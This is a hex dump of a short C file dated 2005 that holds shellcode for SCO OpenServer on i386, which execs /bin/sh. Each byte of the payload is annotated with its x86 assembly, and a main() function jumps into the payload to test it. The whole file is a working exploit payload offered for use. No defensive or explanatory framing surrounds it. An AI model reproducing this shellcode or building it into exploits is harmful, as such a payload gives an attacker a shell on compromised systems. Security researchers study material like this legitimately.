00000000  2f 2a 0d 0a 20 2a 20 20  6d 69 6e 65 72 76 69 6e  |/*.. *  minervin|
00000010  69 20 61 74 20 6e 65 75  72 61 6c 6e 6f 69 73 65  |i at neuralnoise|
00000020  20 64 6f 74 20 63 6f 6d  20 28 63 29 20 32 30 30  | dot com (c) 200|
00000030  35 0d 0a 20 2a 20 20 53  43 4f 5f 53 56 20 73 63  |5.. *  SCO_SV sc|
00000040  6f 73 79 73 76 20 33 2e  32 20 35 2e 30 2e 37 20  |osysv 3.2 5.0.7 |
00000050  69 33 38 36 2c 20 65 78  65 63 76 65 28 22 2f 62  |i386, execve("/b|
00000060  69 6e 2f 73 68 22 2c 20  2e 2e 2e 2c 20 4e 55 4c  |in/sh", ..., NUL|
00000070  4c 29 3b 0d 0a 20 2a 2f  0d 0a 0d 0a 23 69 6e 63  |L);.. */....#inc|
00000080  6c 75 64 65 20 22 73 79  73 2f 74 79 70 65 73 2e  |lude "sys/types.|
00000090  68 22 0d 0a 23 69 6e 63  6c 75 64 65 20 22 73 74  |h"..#include "st|
000000a0  64 69 6f 2e 68 22 0d 0a  0d 0a 63 68 61 72 20 2a  |dio.h"....char *|
000000b0  73 63 6f 64 65 20 3d 20  0d 0a 20 20 22 5c 78 33  |scode = ..  "\x3|
000000c0  31 5c 78 63 39 22 20 20  20 20 20 20 20 20 20 20  |1\xc9"          |
000000d0  20 20 20 2f 2f 20 78 6f  72 20 20 20 20 25 65 63  |   // xor    %ec|
000000e0  78 2c 25 65 63 78 0d 0a  20 20 22 5c 78 38 39 5c  |x,%ecx..  "\x89\|
000000f0  78 65 33 22 20 20 20 20  20 20 20 20 20 20 20 20  |xe3"            |
00000100  20 2f 2f 20 6d 6f 76 20  20 20 20 25 65 73 70 2c  | // mov    %esp,|
00000110  25 65 62 78 0d 0a 20 20  22 5c 78 36 38 5c 78 64  |%ebx..  "\x68\xd|
00000120  30 5c 78 38 63 5c 78 39  37 5c 78 66 66 22 20 2f  |0\x8c\x97\xff" /|
00000130  2f 20 70 75 73 68 20 20  20 24 30 78 66 66 39 37  |/ push   $0xff97|
00000140  38 63 64 30 0d 0a 20 20  22 5c 78 36 38 5c 78 64  |8cd0..  "\x68\xd|
00000150  30 5c 78 39 64 5c 78 39  36 5c 78 39 31 22 20 2f  |0\x9d\x96\x91" /|
00000160  2f 20 70 75 73 68 20 20  20 24 30 78 39 31 39 36  |/ push   $0x9196|
00000170  39 64 64 30 0d 0a 20 20  22 5c 78 38 39 5c 78 65  |9dd0..  "\x89\xe|
00000180  32 22 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |2"             /|
00000190  2f 20 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |/ mov    %esp,%e|
000001a0  64 78 0d 0a 20 20 22 5c  78 36 38 5c 78 66 66 5c  |dx..  "\x68\xff\|
000001b0  78 66 38 5c 78 66 66 5c  78 36 66 22 20 2f 2f 20  |xf8\xff\x6f" // |
000001c0  70 75 73 68 20 20 20 24  30 78 36 66 66 66 66 38  |push   $0x6ffff8|
000001d0  66 66 0d 0a 20 20 22 5c  78 36 38 5c 78 39 61 5c  |ff..  "\x68\x9a\|
000001e0  78 66 66 5c 78 66 66 5c  78 66 66 22 20 2f 2f 20  |xff\xff\xff" // |
000001f0  70 75 73 68 20 20 20 24  30 78 66 66 66 66 66 66  |push   $0xffffff|
00000200  39 61 0d 0a 20 20 22 5c  78 38 30 5c 78 66 31 5c  |9a..  "\x80\xf1\|
00000210  78 31 30 22 20 20 20 20  20 20 20 20 20 2f 2f 20  |x10"         // |
00000220  78 6f 72 20 20 20 20 24  30 78 31 30 2c 25 63 6c  |xor    $0x10,%cl|
00000230  0d 0a 20 20 22 5c 78 66  36 5c 78 31 33 22 20 20  |..  "\xf6\x13"  |
00000240  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6e 6f  |           // no|
00000250  74 62 20 20 20 28 25 65  62 78 29 0d 0a 20 20 22  |tb   (%ebx)..  "|
00000260  5c 78 34 62 22 20 20 20  20 20 20 20 20 20 20 20  |\x4b"           |
00000270  20 20 20 20 20 20 2f 2f  20 64 65 63 20 20 20 20  |      // dec    |
00000280  25 65 62 78 0d 0a 20 20  22 5c 78 65 32 5c 78 66  |%ebx..  "\xe2\xf|
00000290  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |b"             /|
000002a0  2f 20 6c 6f 6f 70 20 20  20 24 2d 33 0d 0a 20 20  |/ loop   $-3..  |
000002b0  22 5c 78 39 31 22 20 20  20 20 20 20 20 20 20 20  |"\x91"          |
000002c0  20 20 20 20 20 20 20 2f  2f 20 78 63 68 67 20 20  |       // xchg  |
000002d0  20 25 65 61 78 2c 25 65  63 78 0d 0a 20 20 22 5c  | %eax,%ecx..  "\|
000002e0  78 35 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x50"            |
000002f0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
00000300  65 61 78 0d 0a 20 20 22  5c 78 35 34 22 20 20 20  |eax..  "\x54"   |
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000320  20 70 75 73 68 20 20 20  25 65 73 70 0d 0a 20 20  | push   %esp..  |
00000330  22 5c 78 35 32 22 20 20  20 20 20 20 20 20 20 20  |"\x52"          |
00000340  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000350  20 25 65 64 78 0d 0a 20  20 22 5c 78 35 30 22 20  | %edx..  "\x50" |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  2f 2f 20 70 75 73 68 20  20 20 25 65 61 78 0d 0a  |// push   %eax..|
00000380  20 20 22 5c 78 33 34 5c  78 33 62 22 20 20 20 20  |  "\x34\x3b"    |
00000390  20 20 20 20 20 20 20 20  20 2f 2f 20 78 6f 72 20  |         // xor |
000003a0  20 20 20 24 30 78 33 62  2c 25 61 6c 0d 0a 20 20  |   $0x3b,%al..  |
000003b0  22 5c 78 66 66 5c 78 65  33 22 3b 20 20 20 20 20  |"\xff\xe3";     |
000003c0  20 20 20 20 20 20 20 2f  2f 20 6a 6d 70 20 20 20  |       // jmp   |
000003d0  20 2a 25 65 62 78 0d 0a  0d 0a 69 6e 74 20 6d 61  | *%ebx....int ma|
000003e0  69 6e 20 28 29 20 7b 0d  0a 20 20 20 76 6f 69 64  |in () {..   void|
000003f0  20 28 2a 63 6f 64 65 29  20 28 29 20 3d 20 28 76  | (*code) () = (v|
00000400  6f 69 64 20 2a 29 20 73  63 6f 64 65 3b 0d 0a 20  |oid *) scode;.. |
00000410  20 20 70 72 69 6e 74 66  28 22 6c 65 6e 67 74 68  |  printf("length|
00000420  3a 20 25 64 5c 6e 22 2c  20 73 74 72 6c 65 6e 28  |: %d\n", strlen(|
00000430  73 63 6f 64 65 29 29 3b  0d 0a 20 20 20 63 6f 64  |scode));..   cod|
00000440  65 28 29 3b 0d 0a 20 20  20 72 65 74 75 72 6e 20  |e();..   return |
00000450  28 30 29 3b 0d 0a 7d                              |(0);..}|
00000457
